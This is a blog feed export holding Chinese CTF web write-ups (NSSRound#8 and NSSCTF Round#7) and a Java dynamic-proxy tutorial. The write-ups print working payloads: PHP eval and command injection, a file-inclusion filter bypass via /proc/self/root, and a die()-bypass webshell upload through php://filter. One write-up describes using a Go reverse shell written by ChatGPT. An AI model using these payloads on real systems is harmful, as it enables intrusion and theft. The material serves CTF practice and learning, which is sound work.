invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有一个eval函数是本题利用点，所以payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?N[S.S=system(&#x27;env&#x27;);</span><br></pre></td></tr></table></figure><p>在环境变量中找到flag。</p><h2 id="MyPage"><a href="#MyPage" class="headerlink" title="MyPage"></a>MyPage</h2><p>第一题的进阶版，老样子用php伪协议读源码，读不出来。经过测试，发现data被过滤了。结合Dest0g3迎新赛的题目，该题目可能是用require_once函数包含，那么题目就转化为如何突破文件包含限制。</p><p>用软连接突破限制，相关文章：<a href="https://www.anquanke.com/post/id/213235#h3-3">php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台</a>所以payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>proc&#x2F;self&#x2F;root&#x2F;是一个指向当前进程的根目录的软链接。经过测试发现var被过滤了，所以接下来要用软连接来代替当前路径，使用&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;软连接。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/cwd/ 是一个特殊的符号链接，它指向当前进程的工作目录</span><br></pre></td></tr></table></figure><p>从而得到题目flag。</p><h2 id="Upload-gogoggo"><a href="#Upload-gogoggo" class="headerlink" title="Upload_gogoggo"></a>Upload_gogoggo</h2><p>文件上传功能，直接先上传一个php一句话木马试试。</p><img src="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/1.png" class><p>看回显，它会将上传的文件名拼接在go语言的命令上，所以我们上传一个run.go，让服务器执行go run来运行我们的代码，至于上传的内容，我们可以用go写一个反弹shell，不会go怎么办，直接去问chatgpt。</p><img src="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/2.png" class><p>公网开启监听2400端口，burp发包：</p><img src="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/3.png" class><p>公网获得靶机权限，查找flag，flag分两段，有点坑人。</p><img src="/2023/02/14/NSSRound-8-Basic%E8%AE%B0%E5%BD%95/4.png" class><p>整合base64解码得到完整flag。</p><h2 id="ez-node（留坑）"><a href="#ez-node（留坑）" class="headerlink" title="ez_node（留坑）"></a>ez_node（留坑）</h2><p>node.js语法太差，跟着师傅的wp和源码跟踪分析还是比较吃力，等以后有时间回看可能会有新的收获。</p><p>下方师傅博客文章：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://gtg.ink/ez-node-NSSCTF-round-8/</span><br><span class="line">https://hujiekang.top/2022/10/11/NodeJS-require-RCE/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代理机制学习</title>
      <link href="/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是代理？"><a href="#什么是代理？" class="headerlink" title="什么是代理？"></a>什么是代理？</h2><p>举个例子，蔡徐坤要开演唱会，那么他需要布置场地，宣传，收钱等工作。这么多繁杂的工作让他一个人做肯定是不的，所以就请了一个经纪人，也就是代理，让经纪人去干这些繁琐的事。而蔡徐坤只需要唱歌就可以了。而这个经纪人也必须代表蔡徐坤演唱会 （也就是拥有委托类的所有方法）。那么，代理模式就是代理类与委托类有相同的接口，代理类是不修改委托类代码的前提下对类的功能进行扩展。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>比较容易理解，写个代码就知道了。先定义一个接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">a1</span>&#123; <span class="comment">//定义一个接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cell</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再写一个委托类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">a2</span> <span class="keyword">implements</span> <span class="title class_">a1</span> &#123; <span class="comment">//设置委托类来重写方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cell</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;方法被重写了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再写一个代理类，代理类也继承于接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ProxyClass</span> <span class="keyword">implements</span> <span class="title class_">a1</span>&#123; <span class="comment">//设置代理类来重写方法</span></span><br><span class="line">    <span class="keyword">private</span> a2 m1;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxyClass</span><span class="params">(a2 m1)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.m1 = m1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cell</span><span class="params">()</span> &#123;</span><br><span class="line">        m1.cell();</span><br><span class="line">        System.out.println(<span class="string">&quot;方法又被重写了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入委托类的实例对象。最后写个测试类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test03</span> &#123; <span class="comment">//测试类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">a1</span> <span class="variable">m1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">a2</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;未代理之前：&quot;</span>);</span><br><span class="line">        m1.cell();</span><br><span class="line">        <span class="type">a1</span> <span class="variable">m2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyClass</span>((a2) m1);</span><br><span class="line">        System.out.println(<span class="string">&quot;代理之后：&quot;</span>);</span><br><span class="line">        m2.cell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将委托类的实例对象传入代理类的构造函数中，得到输出：</p><img src="/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/1.png" class><p>这样代理就对类功能进行了扩展，但是静态代理有很多缺点：如果有一百个对象需要代理，那么就需要实现一百个代理类，如果一个接口需要增加一个方法，那么原实现类和代理类都需要增加这个方法，造成代码臃肿。这时就有了动态代理。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>如何在不编写代理类的情况下创建代理实例，是动态代理解决的问题。在此之前复习一下对象的创建，在加载类的过程中，类加载器会将Class字节码文件加载到内存中，在堆中创建对应的class类对象，该Class类对象拥有该类的所有成员变量，构造器，字段等。再由Class类对象配合构造器创建对象实例。</p><img src="/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/2.png" class><p>至于什么是Class类对象，贴上如下解释：</p><blockquote><ul><li>Class类也是类的一种，只是名字和class关键字高度相似</li><li>Class类的对象是创建的类的类型信息，比如创建一个cat类，那么java就会生成一个内容是cat类的Class类对象。</li><li>在cat类加载时会为每个类生成一个Class类的对象在堆中，每个cat类型的实例都要通过这个Class对象来进行实例化</li><li>无论一个类有多少实例对象，在JVM中都只有一个Class对象</li></ul></blockquote><p>相关文章：<a href="https://blog.csdn.net/mcryeasy/article/details/52344729">到底什么是Class对象呢</a></p><p>说到这里，大概有些思路，我们可以通过代理Class类来创建代理对象实例，绕过代理类的编写。怎么直接获取代理Class类？代理类和委托类都共用一套接口，我们可以通过接口来获取代理类需要的信息。但是接口不能创建对象，该怎么办？不用慌，jdk提供了相关类与API，接下来要说的就是Proxy.getProxyClass()方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line">Proxy.getProxyClass(a1,b1)</span><br></pre></td></tr></table></figure><p>参数a1为类加载器，b2为公用的接口。怎么理解呢？个人感觉像是一种copy操作，将接口Class类对象的类结构信息copy到一个新的Class对象上，然而不同的是，这个新的Class对象存在构造器，能够创建对象实例，也就是代理实例。</p><img src="/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/3.png" class><p>接下来就是通过代理Class对象创建代理实例了。需要使用InvocationHandler接口，创建调用处理器，每次调用代理对象的方法，最终都会调用InvocationHandler类的invoke方法。怎么一回事呢？从代理实例调用方法，会先调用invoke方法，再调用委托类对象的方法。写个例子就好懂多了。</p><p>首先创建个接口。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">hobby</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tag</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">play</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着创建一个委托类来重写方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">person</span> <span class="keyword">implements</span> <span class="title class_">hobby</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">(String food)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我喜欢的食物是&quot;</span>+food);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tag</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我的口头禅是666&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">(String toy)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我喜欢的玩具是&quot;</span>+toy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就是重点，创建一个继承于InvocationHandler接口的实现类，重写invoke方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">personProxy</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object  m1;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">personProxy</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">personProxy</span><span class="params">(Object m1)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.m1 = m1;<span class="comment">//接收委托类对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        proxy:代理类对象，method:调用的什么方法，args:调用方法的参数</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        System.out.println(<span class="string">&quot;invoke以被调用&quot;</span>);<span class="comment">//设置标志</span></span><br><span class="line">        <span class="comment">//方法调用</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> method.invoke(m1,args);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后创建一个专门生产代理对象的工厂，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Proxyfactory</span>&#123;</span><br><span class="line">    <span class="comment">//定义一个静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="type">personProxy</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">personProxy</span>(obj);</span><br><span class="line">        <span class="comment">//通过反射创建代理类实例</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(obj.getClass().getClassLoader(),obj.getClass().getInterfaces(),a1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是测试类了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">hobby</span> <span class="variable">m1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();</span><br><span class="line">        <span class="type">hobby</span> <span class="variable">m3</span> <span class="operator">=</span> (hobby) Proxyfactory.getProxy(m1);</span><br><span class="line">        m3.eat(<span class="string">&quot;土豆&quot;</span>);</span><br><span class="line">        m3.tag();</span><br><span class="line">        m3.play(<span class="string">&quot;变形金刚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><img src="/2023/02/06/java%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/4.png" class><p>可以发现每次调用代理类的方法都会去调用invoke。此篇文章记录自己对于代理机制的学习与感悟，了解更多细节知识参考以下文章，真心写的不错。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/40536038">https://www.zhihu.com/question/40536038</a></p><p><a href="https://zhuanlan.zhihu.com/p/65501610">https://zhuanlan.zhihu.com/p/65501610</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#7 web</title>
      <link href="/2023/02/05/NSSCTF-Round-7-web/"/>
      <url>/2023/02/05/NSSCTF-Round-7-web/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个比赛好像是正月初几举办的，当时还报了名，可到了年后玩嗨了，给忘了。不用慌，题目环境还是有的，就花时间做了做，web四道题，严格来说，只做出了一道半。里面有些题还是比较有意思的，很有必要记录下来。</p><h2 id="ec-RCE"><a href="#ec-RCE" class="headerlink" title="ec_RCE"></a>ec_RCE</h2><p>算是签到题，考察多参数的命令执行。题目给了源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们需要将shell_exec去执行我们的命令，配合我们可控的两个参数将data拼接的单引号给闭合掉，有点像字符逃逸那味儿了，然后我们传入的字符串就能当做shell命令执行了。payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=1&#x27;&amp;data=;cat /flag&#x27;</span><br></pre></td></tr></table></figure><h2 id="0o0"><a href="#0o0" class="headerlink" title="0o0"></a>0o0</h2><p>打开题目啥都没有，直接扫 一波目录。有DS_Store这个文件</p><img src="/2023/02/05/NSSCTF-Round-7-web/1.png" class><p>信息泄露，使用<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a>发现存在Ns_SCtF.php，访问得到题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码忒长了吧。看第一个限制：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br></pre></td></tr></table></figure><p>直接数组绕过，看第二个限制;</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br></pre></td></tr></table></figure><p>in_array函数没有设置type参数，不严格要求被检索数据的类型，所以让$NsScTF传入1q就可以了，这里的一为字符串类型。那么看第三层限制：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br></pre></td></tr></table></figure><p>直接用伪协议，data:&#x2F;&#x2F;text&#x2F;plain，第四层限制为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br></pre></td></tr></table></figure><p>这可以算做两层限制了，我们需要将nss_ctfer.vip改为nss[ctfer.vip，针对于url，一些如[.的敏感字符会被替换为下划线，但是只会替换一次。利用科学技术法来绕过intval函数，$NSScTf传入114514e1。第五层限制为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br></pre></td></tr></table></figure><p>没啥好说的，$nss&#x3D;1，$nSscTF&#x3D;NSSRound7。这里关键部分在文件上传。这里检索上传文件名要有png，这个好绕，只要存在即可。最后就是上传木马要绕过死亡die()，我们将一句话木马base64编码后拼接在后面，另外利用伪协议将文件内容全部base64解码，die就会变成乱码了。不过值得注意的是，base64是四位一组编码，前面拼接的&lt;?php die(“Round7 do you like”);除去字符一共有21个，所以我们需要在后面添加aaa即可，看个例子：</p><img src="/2023/02/05/NSSCTF-Round-7-web/2.png" class><p>GET传参为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTf=data://text/plain;base64,V2VsY29tZSB0byBSb3VuZDchISE=&amp;NsScTF=1q&amp;nss[ctfer.vip=1&amp;NSScTf=114514e1&amp;nSScTF=1&amp;nSscTF=NSSRound7</span><br></pre></td></tr></table></figure><p>文件名为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=1.png.php</span><br></pre></td></tr></table></figure><p>最后别忘了url编码一下。</p><img src="/2023/02/05/NSSCTF-Round-7-web/3.png" class><p>成功植入木马，执行命令得到flag。</p><img src="/2023/02/05/NSSCTF-Round-7-web/4.png" class><p>本题的php小tips挺多的，值得记录的好题。</p><h2 id="ShadowFlag"><a href="#ShadowFlag" class="headerlink" title="ShadowFlag"></a>ShadowFlag</h2><p>打开直接出现python源代码。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span 